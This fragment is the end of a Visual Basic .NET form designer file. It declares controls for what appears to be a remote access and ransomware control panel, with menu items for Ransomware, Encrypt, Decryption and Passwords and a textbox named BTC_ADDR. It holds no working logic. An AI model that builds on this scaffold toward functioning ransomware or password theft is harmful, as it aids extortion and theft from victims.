    Friend WithEvents ChButton1 As CHButton
    Friend WithEvents ChSeparator1 As CHSeparator
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    Friend WithEvents PluginsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RansomwareToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents EncryptToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DecryptionToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CheckFilesToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PasswordsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DetailsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
    Friend WithEvents Flag As ImageList
    Friend WithEvents Country As ColumnHeader
    Friend WithEvents Label7 As Label
    Friend WithEvents BTC_ADDR As CHTextbox
    Friend WithEvents Label9 As Label
    Friend WithEvents Label6 As Label
    Friend WithEvents Label2 As Label
    Friend WithEvents ChButton2 As CHButton
    Friend WithEvents ChGroupBox4 As CHGroupBox
    Friend WithEvents Icon_Box As PictureBox
    Friend WithEvents Icon_OFF As CHOnOffBox
    Friend WithEvents DROP As CHOnOffBox
    Friend WithEvents ToolStripStatusLabel2 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel3 As ToolStripStatusLabel
    Friend WithEvents PIN_CHK As CHCheckbox
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
End Class
